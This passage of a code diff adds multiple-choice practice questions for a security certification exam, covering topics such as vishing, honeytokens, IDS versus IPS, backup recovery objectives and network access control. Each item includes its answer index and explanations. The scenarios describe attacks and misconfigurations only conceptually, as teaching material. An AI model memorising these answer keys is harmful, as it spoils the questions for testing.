+pre:"File integrity check:\nExpected SHA-256 hash (published by vendor): 3fa89b...\nCalculated SHA-256 hash (downloaded file): 3fa89b... (match)\nDigital signature: Valid, signed by 'Acme Software Root CA'",
+q:"What does the matching hash value in this download verification PRIMARILY confirm?",
+c:["Confidentiality of the file in transit","Non-repudiation of the vendor","Integrity - the file was not altered from the original","Availability of the download server"],a:2,
+e:"A matching hash proves the downloaded bytes are identical to what the vendor published, meaning nothing was altered in transit or by a compromised mirror - that's integrity.",
+w:["A matching hash says nothing about whether the file was kept secret in transit; hashing verifies content, not secrecy.","Non-repudiation would require validating the vendor's digital signature specifically, tying the file to a private key only they hold; a simple hash match alone doesn't provide that binding.","","Availability describes whether the download service was reachable, which is unrelated to whether the downloaded file's content matches what was published."]},
+
+{i:2376,d:4,o:"4.1",t:"s",g:"ics-scada-hardening",
+pre:"Industrial control system (ICS) network diagram note:\nSCADA historian server placed on the same flat network segment as corporate email and general office workstations\nNo firewall or VLAN boundary between the two segments",
+q:"Which hardening action would BEST reduce risk to the SCADA environment shown here?",
+c:["Install additional office workstations on the same segment","Upgrade the SCADA historian's operating system to the newest version","Increase the office network's Wi-Fi signal strength","Segment the SCADA/ICS network from the general corporate network"],a:3,
+e:"Placing operational technology like a SCADA historian on the same flat network as general office systems means a compromised office workstation could directly reach critical industrial systems; segmenting ICS/SCADA away from the corporate network is the standard, highest-impact control here.",
+w:["Adding more office workstations to the same flat segment increases exposure to the ICS environment rather than reducing it.","Upgrading the historian's OS may not even be feasible for legacy ICS/SCADA systems, and it doesn't address the underlying lack of network separation, which is the core issue.","Wi-Fi signal strength has no bearing on network segmentation or the risk of a compromised office system reaching SCADA infrastructure.",""]},
+
+{i:2377,d:2,o:"2.1",t:"s",g:"insider-threat-log",
+pre:"HR/IT correlation:\nEmployee received termination notice at 4:45 PM Friday\nAt 4:52 PM, the employee downloaded 12GB from the shared drive to a personal cloud storage account\nNo prior unusual access pattern existed on this account",
+q:"Which threat actor category BEST fits this activity?",
+c:["Insider threat","Hacktivist","Nation-state","Unskilled attacker"],a:0,
+e:"An employee using their own legitimate access to exfiltrate data immediately after being notified of termination is the textbook definition of an insider threat.",
+w:["","Hacktivists act publicly for a cause and typically want attention for their action; a quiet, targeted data grab right after termination doesn't fit that pattern.","Nation-state actors are external, well-resourced, and typically pursue long-term strategic objectives, not a single opportunistic download by a soon-to-be-former employee.","An unskilled attacker is typically an external actor using basic tools; this activity comes from someone with legitimate internal access exploiting their own credentials."]},
+
+{i:2378,d:2,o:"2.2",t:"s",g:"vishing",
+pre:"Help desk call log:\nCaller claims to be 'IT Support', asks employee to read aloud the MFA code just texted to their phone, cites an urgent system outage\nCaller ID: spoofed to match an internal extension",
+q:"Which threat vector does this scenario represent?",
+c:["Phishing","Vishing","Smishing","Business email compromise"],a:1,
+e:"A live phone call using a spoofed caller ID to pressure someone into revealing an MFA code is vishing, voice-based social engineering.",
+w:["Phishing specifically refers to fraudulent email; this attack was conducted entirely over a phone call, not email.","","Smishing uses SMS text messages as the delivery method; this attack used a live voice call, not a text message.","Business email compromise typically involves impersonating an executive or trusted contact via email to redirect payments or data; this incident is a live phone call targeting an MFA code, not an email-based scheme."]},
+
+{i:2379,d:2,o:"2.3",t:"s",g:"cloud-misconfiguration",
+pre:"Cloud storage bucket configuration:\nBucket: customer-uploads-prod\nPublic access: Enabled\nEncryption at rest: Disabled\nVersioning: Enabled",
+q:"Which vulnerability category is illustrated by this configuration?",
+c:["Zero-day","Cryptographic vulnerability","Misconfiguration","Supply chain vulnerability"],a:2,
+e:"Public access left enabled and encryption left disabled are settings someone chose (or failed to change), not an unknown software flaw or a weak algorithm - that's a misconfiguration.",
+w:["A zero-day is an unknown, unpatched software flaw; this issue is a deliberately set (or overlooked) configuration option, not an unknown vulnerability.","A cryptographic vulnerability involves a weak or broken algorithm or implementation; here encryption is simply disabled entirely, which is a configuration choice rather than a flaw in the cryptography itself.","","Supply chain vulnerabilities originate from a vendor, hardware provider, or software provider outside the organization; this is an internally managed storage bucket's own settings."]},
+
+{i:2380,d:2,o:"2.4",t:"s",g:"privilege-escalation-log",
+pre:"Endpoint log:\nUser 'jdoe' (standard user) executed a scheduled task running as SYSTEM\nTask exploited a writable service binary path\njdoe's account was added to the local administrators group at 03:12 AM",
+q:"Which attack technique does this log MOST likely show?",
+c:["Replay attack","Directory traversal","Forgery","Privilege escalation"],a:3,
+e:"A standard user exploiting a writable service path to run as SYSTEM and gain administrator group membership is privilege escalation: turning limited access into elevated access.",
+w:["A replay attack resends a previously captured legitimate request or token; this log shows a standard user exploiting a writable service path to gain higher rights, not resending old traffic.","Directory traversal manipulates file path sequences to reach unauthorized files; this incident is about gaining elevated account privileges, not reading arbitrary files via a crafted path.","Forgery involves crafting a fake request or credential, such as in CSRF; here the user exploited a legitimate but misconfigured service to gain real administrative group membership, not a forged request.",""]},
+
+{i:2381,d:3,o:"3.1",t:"s",g:"iac-security-review",
+pre:"Infrastructure-as-Code plan output (terraform plan):\n+ resource \"aws_security_group_rule\" - ingress 0.0.0.0/0 port 22\n+ resource \"aws_s3_bucket_public_access_block\" - block_public_acls = false",
+q:"Reviewing this IaC plan before deployment BEST reflects which architecture principle?",
+c:["Catching insecure configuration before it reaches production","Physical isolation","Third-party vendor risk transfer","High availability clustering"],a:0,
+e:"Reviewing a terraform plan and spotting an open SSH rule to the entire internet and a disabled public-access block before it ever deploys is exactly the value of catching insecure configuration before it reaches production.",
+w:["","Physical isolation (air-gapping) means a system has no network connection at all; that concept doesn't apply to reviewing a cloud IaC plan before it deploys.","Third-party vendor risk transfer involves shifting risk to a vendor or insurer through contracts; this scenario is about catching a mistake in your own infrastructure code before deployment.","High availability clustering is about redundancy and uptime, not about catching insecure settings like an open SSH rule or a public storage bucket before they go live."]},
+
+{i:2382,d:3,o:"3.2",t:"s",g:"secure-protocol-selection",
+pre:"Network scan of a newly deployed server:\nOpen ports: 21 (FTP), 23 (Telnet), 443 (HTTPS)",
+q:"Which change would BEST improve this server's security posture while preserving remote administration and file transfer capability?",
+c:["Close port 443 and rely on port 80","Replace FTP and Telnet with SFTP and SSH","Open additional ports for redundancy","Change all ports to use UDP instead of TCP"],a:1,
+e:"Swapping the unencrypted FTP and Telnet services for their encrypted equivalents, SFTP and SSH, keeps the same functionality (file transfer and remote administration) while eliminating cleartext protocols.",
+w:["Closing 443 (encrypted HTTPS) and relying only on plain port 80 would remove encryption entirely, making the server less secure, not more.","","Opening additional ports increases the attack surface rather than reducing it and does nothing to replace the insecure FTP and Telnet protocols already in use.","Switching TCP-based protocols to UDP wouldn't function correctly for FTP, Telnet, or HTTPS, and changing the transport protocol has no bearing on whether the application-layer protocol itself is encrypted."]},
+
+{i:2383,d:3,o:"3.3",t:"s",g:"data-in-use",
+pre:"Database monitoring log:\nQuery executed against production database, results returned to application server over an internal TLS 1.3-encrypted connection, then held in application memory during processing",
+q:"At the moment the query results are sitting in the application's memory being processed, which data state applies?",
+c:["Data at rest","Data in transit","Data in use","Data sovereignty"],a:2,
+e:"Data actively loaded into memory and being worked on by a running process is data in use, distinct from sitting on disk (at rest) or moving across the network (in transit).",
+w:["Data at rest describes information stored on disk or in a database while idle; the results here are actively sitting in application memory being processed, not stored at rest.","Data in transit refers to data actively moving across a network connection; that already happened during the TLS-encrypted query and response, but the moment described is after that transfer, while it's being processed in memory.","","Data sovereignty is a legal and geographic concept about which country's laws govern the data, not a description of where data physically sits during processing."]},
+
+{i:2384,d:4,o:"4.1",t:"s",g:"router-default-credentials",
+pre:"Router configuration audit:\nAdmin password: still set to factory default 'admin/admin'\nSSH: enabled and in use\nSNMP: disabled\nUnused ports: administratively shut down",
+q:"Which single finding represents the most urgent security risk on this router?",
+c:["SSH being enabled","Disabling of unused ports","SNMP being disabled","Default admin credentials still in place"],a:3,
+e:"Leaving factory default credentials in place is one of the most exploited weaknesses in network devices, since default admin/admin combinations are publicly documented and trivially guessed by any attacker who reaches the management interface.",
+w:["SSH being enabled and in active use is a secure, expected configuration choice, not a vulnerability.","Disabling unused ports is a hardening best practice that reduces attack surface, not a risk.","Disabling SNMP, rather than leaving a default community string active, is also a hardening best practice that removes an unauthenticated management interface.",""]},
+
+{i:2385,d:4,o:"4.1",t:"s",g:"byod-mdm-enrollment",
+pre:"MDM enrollment log:\nDevice: iPhone, ownership model: personally owned\nEnrollment profile applied: Corporate email, VPN, remote wipe capability\nPersonal apps and photos: not managed or visible to MDM",
+q:"Which mobile deployment model does this enrollment log describe?",
+c:["BYOD","COPE","CYOD","COBO"],a:0,
+e:"The device is personally owned and enrolled just enough to manage corporate resources like email, VPN, and remote wipe, while leaving personal data completely outside MDM visibility - the defining pattern of BYOD.",
+w:["","COPE means the company owns the device even though personal use is allowed; this scan describes a personally owned iPhone, not a company-owned one.","CYOD lets an employee choose from a list of company-owned devices; ownership still sits with the company, unlike the personally owned device described here.","COBO is corporate-owned with no personal use permitted at all, the opposite of a personally owned device with unmanaged personal apps and photos."]},
+
+{i:2386,d:4,o:"4.3",t:"s",g:"vulnerability-false-positive",
+pre:"Vulnerability scan result:\nCVE-2024-55021 flagged on WEB-PROD-02\nManual verification: patch confirmed already installed via package manager; scanner was checking an outdated version banner in the HTTP header only",
+q:"What does this manual verification reveal about the original scan finding?",
+c:["A true positive requiring immediate patching","A false positive caused by an inaccurate detection method","A false negative that missed a real vulnerability","A zero-day with no available patch"],a:1,
+e:"The vulnerability was flagged based only on a stale version banner, but the actual patch was already installed, meaning the scanner's detection method was inaccurate - the definition of a false positive.",
+w:["A true positive would mean the vulnerability genuinely exists on the system, which manual verification specifically disproved by confirming the patch was already installed.","","A false negative means a real vulnerability was missed by the scan entirely, the opposite situation from a scan flagging something that manual review then disproved.","Nothing here suggests an unpatched, unknown flaw; a patch exists and was already confirmed installed, ruling out a zero-day."]},
+
+{i:2387,d:4,o:"4.4",t:"s",g:"scap-benchmark-tool",
+pre:"Security tool output:\nBenchmark: CIS Level 1 - Windows Server 2022\nCompliant controls: 187 of 210\nNon-compliant: 23, auto-remediation script queued for 15 of them",
+q:"Which type of tool MOST likely produced this benchmark compliance report?",
+c:["A vulnerability scanner","A SIEM correlation engine","A SCAP-compliant configuration tool","A data loss prevention system"],a:2,
+e:"Comparing a system's configuration against a published benchmark like CIS controls, and reporting compliant versus non-compliant items with remediation, is exactly what SCAP (Security Content Automation Protocol) benchmarking tools are designed to do.",
+w:["A vulnerability scanner looks for known software flaws tied to CVEs, not configuration benchmark compliance.","A SIEM correlates log events from multiple sources to generate alerts; it doesn't grade a system's configuration against a formal benchmark.","","DLP focuses on preventing sensitive data from leaving the organization, which is unrelated to configuration benchmark compliance reporting."]},
+
+{i:2388,d:4,o:"4.6",t:"s",g:"saml-federation-sso",
+pre:"SSO authentication trace:\nIdentity Provider (IdP): CorpOkta\nService Provider (SP): SalesCloudApp\nAssertion issued: SAML 2.0, signed and time-limited\nUser authenticated once at the IdP, then granted access to SalesCloudApp without re-entering credentials",
+q:"Which technology is directly responsible for allowing the user to access SalesCloudApp without a second login?",
+c:["OAuth","LDAP","RADIUS","SAML-based federation and single sign-on"],a:3,
+e:"A signed SAML assertion issued by one trusted identity provider and accepted by a separate service provider to grant access without a second login is the core mechanism of SAML-based federation and single sign-on.",
+w:["OAuth is primarily used for delegated authorization to APIs and resources, a different purpose than the browser-based SSO assertion flow shown in this trace.","LDAP is a directory protocol used to store and query identity information; it doesn't issue the signed assertions that allow cross-application single sign-on shown here.","RADIUS handles authentication for network access scenarios like VPN or Wi-Fi logins, not federated single sign-on between web applications.",""]},
+
+{i:2389,d:4,o:"4.9",t:"s",g:"nat-log-analysis",
+pre:"Firewall NAT log:\nInternal: 10.0.5.22:52201\nTranslated to: 203.0.113.44:33021\nDestination: 8.8.8.8:443\nTimestamp: 14:02:09",
+q:"An investigator wants to identify which internal workstation generated a specific piece of outbound internet traffic seen from the public IP 203.0.113.44. Which log type provides this mapping?",
+c:["Firewall NAT logs","DNS logs","Application logs","Vulnerability scan output"],a:0,
+e:"NAT logs record the translation between an internal private IP/port and the external public IP/port used for outbound traffic, exactly the mapping needed to trace a public-facing connection back to the originating internal host.",
+w:["","DNS logs show domain lookups, not IP-to-IP translation mappings.","Application logs record events inside a specific piece of software, not network-level address translation.","Vulnerability scan output lists security weaknesses found on systems; it has no connection to tracing a live outbound connection back to its source host."]},
+
+{i:2390,d:5,o:"5.1",t:"s",g:"governance-policy-type",
+pre:"Policy excerpt:\nDocument: Acceptable Use Policy v4.2\nSection 3.1: 'Company-issued devices may not be used to access personal social media accounts during work hours.'\nApproved by: IT Governance Committee\nEffective date: reviewed annually",
+q:"Which type of governance document is shown here?",
+c:["A standard","A policy","A guideline","A procedure"],a:1,
+e:"A formally approved, mandatory rule about acceptable behavior on company devices, reviewed and owned by a governance body, is a policy - specifically an acceptable use policy.",
+w:["A standard would define specific mandatory technical requirements, such as a minimum password length, rather than a general behavioral rule like this one.","","A guideline is a recommended, non-mandatory best practice; this document states a firm, approved restriction, not an optional suggestion.","A procedure provides step-by-step instructions for performing a task; this document states a behavioral rule rather than a sequence of steps to follow."]},
+
+{i:2391,d:5,o:"5.3",t:"s",g:"sla-agreement-type",
+pre:"Contract excerpt:\n'Vendor guarantees 99.9% uptime for the hosted application. Any downtime beyond this threshold results in service credits per the schedule in Appendix B.'",
+q:"Which type of agreement MOST likely contains this clause?",
+c:["Non-disclosure agreement (NDA)","Memorandum of understanding (MOU)","Service-level agreement (SLA)","Business partners agreement (BPA)"],a:2,
+e:"A specific, measurable performance guarantee (99.9% uptime) with defined penalties for missing it is the defining feature of a service-level agreement.",
+w:["An NDA governs confidentiality of shared information, not uptime guarantees.","An MOU is a general, often non-binding statement of intent between parties, not a specific measurable performance commitment with financial penalties.","","A BPA establishes the terms of a business partnership relationship broadly, not specific uptime metrics with defined service credits."]},
+
+{i:2392,d:5,o:"5.6",t:"s",g:"phishing-simulation-metrics",
+pre:"Phishing simulation report:\nCampaign: Q3 2026 all-staff simulation\nClick rate: 4% (down from 22% in Q1)\nReporting rate (staff who flagged the email to security): 61%\nRepeat clickers: 3 employees, enrolled in additional targeted training",
+q:"Which metric BEST demonstrates the effectiveness of the organization's security awareness training over time?",
+c:["The total number of employees in the company","The number of phishing emails sent during the campaign","The names of the three repeat clickers","The declining click rate compared to Q1"],a:3,
+e:"A significant drop in click rate across successive simulations (22% down to 4%) directly measures whether employees are getting better at recognizing and avoiding phishing attempts, the core goal of security awareness training.",
+w:["Total headcount is just a company size figure and says nothing about whether training is actually changing employee behavior.","The number of phishing emails sent describes the scope of the test itself, not how well employees performed against it.","Knowing the names of the three repeat clickers is useful for targeted follow-up training, but it doesn't measure the effectiveness of the awareness program as a whole.",""]},
+
+];
+
+const Q19 = [
+{i:2393,d:3,o:"3.2",t:"s",g:"jump-server-log",
+pre:"Network access log:\nAdmin connects via SSH to bastion-01 (10.0.0.5)\nFrom bastion-01, admin then SSHs onward to internal DB server DB-PROD-01 (172.16.5.10)\nDirect SSH access to 172.16.5.10 from the admin's workstation is blocked by firewall policy",
+q:"Which network appliance does bastion-01 represent in this access pattern?",
+c:["Jump server","Proxy server","Load balancer","IPS"],a:0,
+e:"A jump server (bastion host) is a hardened intermediary that administrators must pass through to reach a restricted internal segment, exactly the role bastion-01 plays here.",
+w:["","A proxy server relays and mediates outbound traffic, often for content filtering or anonymizing client requests to external destinations; it isn't used to chain an admin's own access into a restricted internal segment like this.","A load balancer distributes traffic across multiple backend servers based on availability, unrelated to this access-chaining scenario.","An IPS inspects and blocks malicious traffic patterns; it doesn't serve as an intermediary hop for legitimate administrative access."]},
+
+{i:2394,d:3,o:"3.2",t:"s",g:"proxy-server-log",
+pre:"Web proxy log:\nInternal client 10.0.9.14 requests http://newsite.example.com\nProxy checks URL category: 'Gambling' - BLOCKED\nClient's real IP never sent directly to newsite.example.com",
+q:"Which network appliance generated this log?",
+c:["Jump server","Proxy server","IDS","Load balancer"],a:1,
+e:"Mediating a client's outbound web request, checking it against a URL category policy, and shielding the client's real IP from the destination is the core function of a proxy server.",
+w:["A jump server is a hardened intermediary specifically for administrative access into a restricted network segment, not for filtering general web browsing.","","An IDS only detects and alerts; it doesn't perform URL category filtering or mediate outbound web requests.","A load balancer distributes traffic across multiple servers, unrelated to filtering outbound web content by category."]},
+
+{i:2395,d:3,o:"3.2",t:"s",g:"ids-vs-ips-passive",
+pre:"Network sensor alert:\nSignature match: Known exploit kit traffic pattern\nAction taken: Alert generated, traffic allowed to pass\nDeployment mode: Passive (SPAN port, out-of-band)",
+q:"Which device generated this alert?",
+c:["IPS","NGFW","IDS","WAF"],a:2,
+e:"A device that only alerts while letting traffic continue to flow, deployed passively off a SPAN port rather than inline, is an IDS - it detects but cannot act.",
+w:["An IPS sits inline and can actively block traffic, but this device only alerted while allowing traffic through, which doesn't match IPS behavior.","An NGFW performs inline blocking with broader application awareness, not a passive, alert-only sensor deployed off a SPAN port.","","A WAF specifically filters HTTP/web application traffic, not general exploit-kit network signatures observed passively."]},
+
+{i:2396,d:3,o:"3.2",t:"s",g:"ips-active-blocking",
+pre:"Network sensor alert:\nSignature match: Known exploit kit traffic pattern\nAction taken: Connection reset and traffic dropped immediately\nDeployment mode: Inline (traffic must pass through the device)",
+q:"Which device generated this alert?",
+c:["IDS","Sensor (passive tap)","Load balancer","IPS"],a:3,
+e:"A device deployed inline that actively resets connections and drops malicious traffic in real time is an IPS - the defining difference from an IDS is the ability to act, not just alert.",
+w:["IDS is passive and can only alert, not drop connections or sit inline.","A passive tap or sensor mirrors traffic for observation and cannot actively terminate connections.","A load balancer distributes traffic across servers and has no signature-based blocking function.",""]},
+
+{i:2397,d:1,o:"1.2",t:"s",g:"honeytoken-log",
+pre:"Alert: A fake AWS API key embedded in a public code repository was used to make an API call to AWS from an unrecognized IP address. The key was never a valid credential and exists solely to trigger this alert if used.",
+q:"What is this fake credential an example of?",
+c:["Honeytoken","Honeypot","Honeynet","Honeyfile"],a:0,
+e:"A single piece of fake data, like a bogus API key, planted so that any use of it anywhere triggers an alert, is specifically a honeytoken.",
+w:["","A honeypot is an entire decoy system or service, not a single fake data value like this credential.","A honeynet is a decoy network made up of many honeypots, far larger in scope than one planted fake credential.","A honeyfile is a decoy file placed to be opened in a specific location; this scenario involves a fake piece of data tracked wherever it's used, which is specifically a honeytoken, not a file."]},
+
+{i:2398,d:1,o:"1.2",t:"s",g:"honeyfile-log",
+pre:"Alert: File 'Q4_Executive_Salaries.xlsx' was opened on FS-02. This file was placed on the share specifically as a decoy; no legitimate business process ever references it, and any open event triggers an immediate alert.",
+q:"What is this file an example of?",
+c:["Honeytoken","Honeyfile","Honeynet","Honeypot"],a:1,
+e:"A decoy file sitting in place on a real file server, where any access to it is a high-confidence indicator of compromise, is a honeyfile.",
+w:["A honeytoken is a piece of fake data (like a credential or record) tracked wherever it travels, not a decoy file meant to be opened in place.","","A honeynet is a decoy network of systems, much larger in scope than one file.","A honeypot is an entire decoy system or service, not a single file sitting on a real file server."]},
+
+{i:2399,d:5,o:"5.2",t:"s",g:"rto-not-met",
+pre:"Disaster recovery test report:\nOutage began: 09:00\nLast valid backup before outage: 07:00 (2 hours of data loss)\nSystem fully restored and operational: 11:30 (2.5 hours after outage began)\nDefined targets: RTO = 4 hours, RPO = 1 hour",
+q:"Which defined target was NOT met during this test?",
+c:["RTO","MTTR","RPO","MTBF"],a:2,
+e:"The gap between the last backup (07:00) and the outage (09:00) means 2 hours of data was lost, exceeding the 1-hour RPO target, even though the 4-hour RTO was comfortably met.",
+w:["RTO (4 hours) was met since the system was restored in 2.5 hours, well within target.","MTTR describes average repair time across many incidents, not a single test's pass/fail against a defined target.","","MTBF measures the average time between failures, unrelated to this single recovery event's data-loss window."]},
+
+{i:2400,d:5,o:"5.2",t:"s",g:"rpo-calc",
+pre:"Backup schedule:\nFull backup: Sunday 01:00\nIncremental backups: every 6 hours\nA ransomware outage occurs Wednesday at 14:00\nMost recent incremental backup completed: Wednesday 12:00",
+q:"Based on this backup schedule, what is the MAXIMUM data loss the organization should expect, matching its recovery point objective planning?",
+c:["6 hours","24 hours","0 hours","2 hours"],a:3,
+e:"The gap between the last completed backup (12:00) and the outage (14:00) is 2 hours, which is the actual data loss window, not the general 6-hour interval between scheduled incrementals.",
+w:["6 hours is the general incremental interval, not the actual gap since the last completed backup, which finished just 2 hours before the outage.","24 hours would apply if backups were only performed daily, which isn't the case with 6-hour incrementals.","0 hours would only apply if a backup completed at the exact moment of failure, which it did not.",""]},
+
+{i:2401,d:3,o:"3.4",t:"s",g:"warm-site",
+pre:"Disaster recovery site specification:\nFacility maintains partially configured servers and networking equipment\nData is replicated periodically (not real-time)\nEstimated activation time: 24-48 hours",
+q:"Which type of recovery site is described?",
+c:["Warm site","Hot site","Cold site","Geographic dispersion"],a:0,
+e:"Partially configured equipment with periodic (not real-time) replication and an activation window measured in days rather than minutes or weeks is the definition of a warm site.",
+w:["","A hot site is fully configured and ready for near-immediate failover (minutes, not days), unlike the 24-48 hour activation described here.","A cold site provides only basic infrastructure like power and space with no pre-installed equipment, requiring far longer than 24-48 hours to activate.","Geographic dispersion describes spreading resources across locations generally, not a specific site-readiness tier like hot, warm, or cold."]},
+
+{i:2402,d:4,o:"4.9",t:"s",g:"application-logs",
+pre:"Application log:\nERROR 2026-08-30 14:02:11 - Payment gateway timeout after 30000ms\nWARN 2026-08-30 14:02:15 - Retry attempt 1 of 3 failed\nERROR 2026-08-30 14:02:45 - Order #88213 marked as FAILED, customer not charged",
+q:"Which log source would an analyst review to investigate this payment failure?",
+c:["Firewall logs","Application logs","DNS logs","IPS/IDS logs"],a:1,
+e:"Timeout errors, retry attempts, and an order status change are internal business-logic events generated by the payment application itself, exactly what application logs record.",
+w:["Firewall logs show allow/deny decisions on network traffic, not internal application error messages like a timeout and retry sequence.","","DNS logs record domain lookups, unrelated to a payment gateway's internal error handling.","IPS/IDS logs record signature-based network alerts, not application-level business logic failures like a failed order."]},
+
+{i:2403,d:4,o:"4.9",t:"s",g:"endpoint-logs",
+pre:"Endpoint log (EDR agent):\nProcess: powershell.exe spawned by winword.exe\nParent document: invoice_report.docm (macro-enabled)\nCommand line: -enc <base64 blob>\nAction: Process flagged and suspended",
+q:"Which log source captured this event?",
+c:["Network logs","Metadata","Endpoint logs","Vulnerability scans"],a:2,
+e:"Recording which process spawned another, the full command line used, and the action taken on the host itself is exactly what endpoint (EDR) logs capture.",
+w:["Network logs record traffic between hosts, not process execution details on a single machine.","Metadata describes properties of a file (like author or creation date), not live process behavior.","","Vulnerability scans identify known weaknesses in software, not real-time process execution events."]},
+
+{i:2404,d:4,o:"4.9",t:"s",g:"os-security-logs",
+pre:"Windows Security Event Log:\nEvent ID 4720: A user account was created\nEvent ID 4732: The new account was added to the local Administrators group\nBoth events occurred at 03:14 AM from an interactive logon session",
+q:"Which log source recorded these account creation and privilege events?",
+c:["Application logs","Packet captures","Automated reports","OS-specific security logs"],a:3,
+e:"Windows Event IDs for account creation and group membership changes are recorded by the operating system's own security auditing subsystem, making this an OS-specific security log.",
+w:["Application logs record events from specific software applications, not core operating system security events like account creation tracked by Windows Event IDs.","Packet captures record network traffic at the packet level, not OS-level account management events.","Automated reports summarize findings periodically and wouldn't be the original source recording these specific event IDs in real time.",""]},
+
+{i:2405,d:2,o:"2.5",t:"s",g:"segmentation-vs-isolation",
+pre:"Incident response action:\nCompromised host WKS-19 removed from all network access entirely (physically unplugged and disabled at the switch port) pending forensic imaging",
+q:"Which mitigation technique is being applied to WKS-19?",
+c:["Isolation","Segmentation","Patching","Least privilege"],a:0,
+e:"Completely cutting one specific compromised host off from all network access is isolation, distinct from segmentation, which divides a broader network into zones for many systems.",
+w:["","Segmentation divides a broader network into separate zones for many systems, not the complete removal of one specific host from all access.","Patching applies software updates to fix vulnerabilities, not physically disconnecting a machine.","Least privilege restricts what an account or process can do, not whether a machine has any network connectivity at all."]},
+
+{i:2406,d:4,o:"4.5",t:"s",g:"nac-tool",
+pre:"Network access control (NAC) log:\nDevice attempting to connect: unmanaged laptop, no antivirus agent detected, OS patch level non-compliant\nAction: Device quarantined to remediation VLAN, denied access to corporate resources",
+q:"Which tool enforced this decision?",
+c:["Data loss prevention (DLP)","Network access control (NAC)","Endpoint detection and response (EDR)","Security information and event management (SIEM)"],a:1,
+e:"Evaluating a device's compliance posture (AV status, patch level) before deciding whether to admit it to the network, and quarantining it if it fails, is exactly what NAC does.",
+w:["DLP focuses on preventing sensitive data from leaving the organization through channels like email or USB, not evaluating a device's compliance posture before granting network access.","","EDR detects and responds to malicious activity already occurring on an endpoint, rather than gatekeeping initial network admission.","SIEM aggregates and correlates logs for alerting; it doesn't itself quarantine devices onto a VLAN."]},
+
+{i:2407,d:4,o:"4.7",t:"s",g:"automation-deprovisioning",
+pre:"Automation script log:\nTrigger: HR system marks employee status as 'Terminated'\nAction: Account automatically disabled in Active Directory, VPN certificate revoked, all active sessions terminated\nCompleted within 90 seconds of the HR status change, no manual ticket required",
+q:"Which benefit of automation is BEST demonstrated by this workflow?",
+c:["Increased technical debt","Single point of failure","Improved reaction time and reduced risk window","Employee retention"],a:2,
+e:"Disabling access within 90 seconds of a termination event, without waiting on a manual ticket, directly shrinks the window an ex-employee's credentials remain valid - a clear reaction-time benefit of automation.",
+w:["Technical debt refers to accumulated shortcuts in code or infrastructure over time, not a fast, clean deprovisioning workflow.","A single point of failure describes a risk if the one system fails, which isn't what's being demonstrated by this successful automated action.","","Employee retention is an HR-focused benefit sometimes linked to reduced manual burden on IT staff, not directly measured by this specific deprovisioning speed."]},
+
+{i:2408,d:4,o:"4.8",t:"s",g:"chain-of-custody",
+pre:"Evidence log:\nHard drive removed from WKS-19 at 10:14 AM by analyst J. Reyes\nSigned over to forensic examiner at 10:22 AM\nStored in evidence locker #4, tamper-evident seal applied\nEvery transfer logged with timestamp, name, and signature",
+q:"Which digital forensics concept does this log demonstrate?",
+c:["Legal hold","E-discovery","Root cause analysis","Chain of custody"],a:3,
+e:"A documented, unbroken record of who handled a piece of evidence, when, and how it was secured at each step is chain of custody, which preserves the evidence's integrity for legal purposes.",
+w:["Legal hold is a directive to preserve data relevant to anticipated litigation, not a record of who physically handled evidence.","E-discovery is the process of identifying and producing electronic evidence for legal proceedings, a broader legal process rather than this specific handoff log.","Root cause analysis investigates why an incident happened, not how evidence was physically tracked and transferred.",""]},
+
+{i:2409,d:3,o:"3.2",t:"s",g:"inline-vs-passive-sensor",
+pre:"Device deployment note:\nSensor connected to a SPAN/mirror port on the core switch\nSensor receives a copy of all traffic but is not in the direct path between hosts\nIf the sensor fails, network traffic continues to flow unaffected",
+q:"Which device attribute does this describe?",
+c:["Passive and tap/monitor","Active and inline","Fail-closed","Active and fail-open"],a:0,
+e:"A device that only receives a mirrored copy of traffic and whose failure has no impact on live traffic flow is passive and operating in tap/monitor mode, not inline.",
+w:["","An inline device sits directly in the traffic path, meaning its failure could interrupt traffic flow, the opposite of what's described here.","Fail-closed describes a device that blocks all traffic if it fails, which only applies to inline devices, not a passive tap that never touches live traffic.","An active inline device with fail-open still requires it to be in the traffic path, unlike this SPAN-port sensor, which never touches live traffic at all."]},
+
+{i:2410,d:5,o:"5.4",t:"s",g:"compliance-attestation",
+pre:"Internal audit finding:\nControl tested: quarterly access reviews for privileged accounts\nEvidence provided: signed attestation forms from department managers confirming review completion\nAuditor conclusion: Control operating effectively",
+q:"Which compliance monitoring activity does the signed attestation form represent?",
+c:["Automation","Attestation and acknowledgement","Right to be forgotten","Data inventory and retention"],a:1,
+e:"A manager formally signing off to confirm a required review was actually completed is attestation and acknowledgement, a key compliance monitoring activity auditors rely on as evidence.",
+w:["Automation refers to using tools or scripts to perform compliance checks without manual intervention, not a manager's signed confirmation.","","Right to be forgotten is a privacy right allowing individuals to request data deletion, unrelated to an internal access review sign-off.","Data inventory and retention tracks what data exists and how long it's kept, not a manager's confirmation that a review process was completed."]},
+
+{i:2411,d:5,o:"5.5",t:"s",g:"passive-reconnaissance",
+pre:"Penetration test log:\nDay 1 activity: Reviewed publicly available job postings, DNS records, and employee LinkedIn profiles\nNo packets sent to the target's network\nDay 2 activity begins with port scanning the target's public IP range",
+q:"Which type of reconnaissance describes the Day 1 activity?",
+c:["Active reconnaissance","Known environment testing","Passive reconnaissance","Offensive penetration testing"],a:2,
+e:"Gathering information from public sources without ever sending traffic to the target's own systems is passive reconnaissance; the direct interaction with Day 2's port scan is what makes that phase active.",
+w:["Active reconnaissance involves direct interaction with the target's systems, such as the port scanning that begins on Day 2, not simply reviewing public information.","Known environment testing describes how much internal knowledge the tester was given up front, an unrelated concept to the recon technique used.","","Offensive penetration testing describes the overall goal and posture of the test, not the specific passive-versus-active nature of a reconnaissance step."]},
+
+{i:2412,d:2,o:"2.4",t:"s",g:"account-lockout-indicator",
+pre:"SIEM alert:\nUser account 'rwilliams' locked out after 5 consecutive failed login attempts within 2 minutes\nLockout policy: 5 attempts / 30-minute lockout duration\nNo successful login occurred before or after the lockout",
+q:"Which indicator of malicious activity does this alert represent?",
+c:["Impossible travel","Concurrent session usage","Resource consumption","Account lockout"],a:3,
+e:"An account hitting its failed-attempt threshold and triggering a lockout, with no successful login on either side, is the account lockout indicator - it points to a likely guessing attempt rather than a successful compromise.",
+w:["Impossible travel refers to logins from geographically distant locations in an implausible timeframe, not a lockout from repeated failed attempts.","Concurrent session usage flags the same account active from multiple locations simultaneously, not a lockout event.","Resource consumption indicators point to abnormal CPU, memory, or bandwidth usage, unrelated to a failed-login lockout.",""]},
+
+];
+
+const Q20 = [
+{i:2413,d:5,o:"5.2",t:"s",g:"risk-threshold-vs-appetite",
